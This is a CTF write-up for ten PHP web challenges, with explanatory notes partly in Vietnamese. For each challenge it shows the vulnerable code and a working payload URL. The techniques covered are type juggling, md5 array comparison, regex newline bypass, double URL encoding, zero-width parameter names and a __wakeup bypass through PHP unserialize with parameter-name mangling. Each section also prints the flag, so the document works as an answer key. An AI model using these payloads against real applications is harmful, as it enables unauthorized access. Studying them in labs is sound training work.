# chetdotvn solutions

## Index
- [challenge/1](#challenge1)
- [challenge/2](#challenge2)
- [challenge/3](#challenge3)
- [challenge/4](#challenge4)
- [challenge/5](#challenge5)
- [challenge/6](#challenge6)
- [challenge/7](#challenge7)
- [challenge/8](#challenge8)
- [challenge/9](#challenge9)
- [challenge/10](#challenge10)


## challenge/1

Ctrl + U

Flag: `FLAG{ddf1ea89-cd89-4da3-98bc-08028ac4dc7e}`

## challenge/2

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
highlight_file(__FILE__);
die(base64_encode(hex2bin(strrev(bin2hex(str_rot13(print_flag(2))))))); 1wc39mNzY4NDE1NTk9JD5vbm0mNDQ0PSQ5MHU9L2g+YHQ2NTB7dF5JU1
```

Solution:

```php
<?php
echo str_rot13(hex2bin(strrev(bin2hex(base64_decode('1wc39mNzY4NDE1NTk9JD5vbm0mNDQ0PSQ5MHU9L2g+YHQ2NTB7dF5JU1')))));
?> 
```

Flag: `FLAG{c564ca8b-5c94-4446-aba4-955148676bfc}`

## challenge/3

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
if(isset($_GET['number'])) {
    $number = $_GET['number'];
    if($number === '1337') {
        die('no');
    }
    if(intval($number, 0) === 1337) {
        die(print_flag(3));
    }
}
highlight_file(__FILE__);
```

Solution:

```
https://xn--cht-8jz.vn/challenge/3/?number=1337a
```

Flag: `FLAG{554382f3-960e-4859-9c79-c64ecd4445e7}`

## challenge/4

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
if(isset($_GET[0]) && isset($_GET[1])) {
    if($_GET[0] != $_GET[1]) {
        if (md5($_GET[0]) === md5($_GET[1])) {
            die(print_flag(4));
        }
    }
}
highlight_file(__FILE__);
```

Solution:

```
https://xn--cht-8jz.vn/challenge/4/?0[]=0&1[]=1
```

Flag: `FLAG{82104890-f270-4d27-b4e4-638a940ffdcf}`

## challenge/5

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
if(isset($_GET['inp'])) {
    $inp = $_GET['inp'];
    if(((array)simplexml_load_string(file_get_contents($inp))->f->l->a->g)[0] === 'flagggggggggggggg') {
        die(print_flag(5));
    }
}

highlight_file(__FILE__);
```

Solution:

```xml
<?xml version="1.0" ?>
<wrapper>
<f>
	<l>
		<a>
			<g>flagggggggggggggg</g>
		</a>
	</l>
</f>
</wrapper>


https://xn--cht-8jz.vn/challenge/5/?inp=https://pastebin.com/raw/DKr4REdU
```

Flag: `FLAG{19ee9d17-7f23-4c03-b702-4276246ccdb2}`

## challenge/6

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
if(isset($_GET['number'])) {
    $number = $_GET['number'];
    if(preg_match('/[0-9]/', $number)) {
        die('waf');
    } else if(intval($number)) {
        die(print_flag(6));
    }
}
highlight_file(__FILE__);
```

Solution:

```
https://xn--cht-8jz.vn/challenge/6/?number[]=abc123
```

Flag: `FLAG{2352ca3b-c94e-450b-b69a-1938cab26571}`

## challenge/7

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
$user = ['admin', 'lord'];
if(isset($_GET['u'])) {
    if($_GET['u⁠'] === $user && $_GET['u'][0] !== 'admin') {
        die(print_flag(7));
    }
}
highlight_file(__FILE__);
```

Solution:

Copy vào VSC ta thấy điều đặc biệt tại `$_GET['u⁠']`

![image](https://user-images.githubusercontent.com/80137840/225309410-068f0536-1476-47e1-84ca-179ba0d7f0bb.png)

Sau ký tự `u` có 1 ký tự đặc biệt được gọi là zero-width space - ký tự khoảng trống không có chiều rộng

Convert 4 ký tự bao gồm cả 'u' sang dạng hexa ta thấy ký tự này gồm 3 bytes `e2 81 a0`

![image](https://user-images.githubusercontent.com/80137840/225315799-54f77177-d6ea-4138-b726-0376daf9c35b.png)

Như vậy tên array so sánh với $user được tạo bởi ký tự `u` và 3 bytes `%e2 %81 %a0`, còn u[0] thì gán giá trị nào khác 'admin' là được

```
https://xn--cht-8jz.vn/challenge/7/?u%e2%81%a0[]=admin&u%e2%81%a0[]=lord&u[]=abcxyz
```

Flag: `FLAG{07af425c-fc46-4689-aaf6-5512e4271f63}`

## challenge/8

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
if(isset($_GET['u'])) {
    if(preg_match('/admin/',$_GET['u'])) die('no no no');
    $u = urldecode($_GET['u']);
    if($u == 'admin'){
        die(print_flag(8));
    }
}
highlight_file(__FILE__);
```

Solution:

Encode URL 'admin' 2 lần

```
https://xn--cht-8jz.vn/challenge/8/?u=%2561%2564%256d%2569%256e
```

Flag: `FLAG{0406eb88-39ce-4dcc-bace-b058a7e57dd0}`

## challenge/9

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
if(isset($_GET['say']) && strlen($_GET['say']) < 28) {
    $say = preg_replace('/^(.*)flag(.*)$/', 'waf', $_GET['say']);
    if(preg_match('/give_me_the_flag/', $say)) {
        die(print_flag(9));
    }
}
highlight_file(__FILE__);
```

Solution:

Regex (.*) không bao gồm ký tự linefeed (\n) có dạng hexa %0a

```
https://xn--cht-8jz.vn/challenge/9/?say=%0agive_me_the_flag
```

Flag: `FLAG{62e0d117-93af-4e36-957c-3841d1ae7100}`

## challenge/10

```php
<?php
include __DIR__.'/../../secret.php';
error_reporting(0);
class Get_Flag{
    public $get = True;
    public function __destruct(){
        if($this->get === True){
            die(print_flag(10));
        }
    }
    public function __wakeup(){
        $this->get = False;
    }
}
if(isset($_GET['get_flag.php'])){
    unserialize($_GET['get_flag.php']);
}
highlight_file(__FILE__);
```

Solution:

Ta cần phải tạo chuỗi serialized object cho đối tượng của class Get_Flag. Class này có 1 thuộc tính `$get = True` và 2 magic method `__destruct()` và `__wakeup()`. Tuy nhiên khi unserialize gọi method `__wakeup()` sẽ thay đổi giá trị thuộc tính $get thành False và khi kết thúc chương trình gọi method `__destruct()` sẽ không gọi tới hàm in flag được. 

Vậy thì để gọi được tới hàm in ra flag, ta cần khiến cho chương trình không gọi tới method `__wakeup()` khi unserialize. Để làm điều này ta có thể sử dụng C thay O trong chuỗi serialized object, đây được gọi là dạng customized serializing. Dạng custom serialize này không support `__sleep()` và `__wakeup()`

=> Chuỗi serialized object được tạo có dạng: `C:8:"Get_Flag":0:{}`

Tuy nhiên tên param để biến `$_GET` nhận input là `get_flag.php` có ký tự `.`. Trong xử lý tên biến của PHP 7.4.33, nếu tên biến có ký tự ' ' hoặc '.' sẽ được chuyển thành '_'. Tham khảo chi tiết tại: https://github.com/php/php-src/blob/php-7.4.33/main/php_variables.c#L68. 

![image](https://user-images.githubusercontent.com/80137840/225353897-2e588b32-bb8f-40c9-8c5b-a91ed9adb196.png)

Vòng loop kiểm tra nếu ký tự bằng '[' sẽ đặt biến `is_array = 1`, đặt con trỏ xứ lý tên phần tử trong mảng và break vòng loop. Tuy nhiên khi kết thúc tên biến mà không tìm thấy ký tự đóng array ']', PHP sẽ chuyển ký tự '[' thành '_'

![image](https://user-images.githubusercontent.com/80137840/225363339-a5025167-97ba-40c5-bf0b-0bc3e5524688.png)

Như vậy để giữ lại ký tự '.' nằm được trong tên biến thì vòng loop cần phải được break trước khi duyệt đến ký tự '.'. Ta thấy ở trước đó có ký tự `_`, vậy ta sẽ thay thế ở vị trí đó bằng ký tự '[' để khi xử lý tên biến, PHP sẽ break vòng loop và chuyển '[' thành '_'. Khi đó biến $_GET sẽ nhận được giá trị param `get_flag.php`

```
Payload:
https://xn--cht-8jz.vn/challenge/10/?get[flag.php=C%3A8%3A%22Get_Flag%22%3A0%3A%7B%7D
```

Flag: `FLAG{e4bd6b96-9c8b-4b30-8ffc-7ba57770c123}`



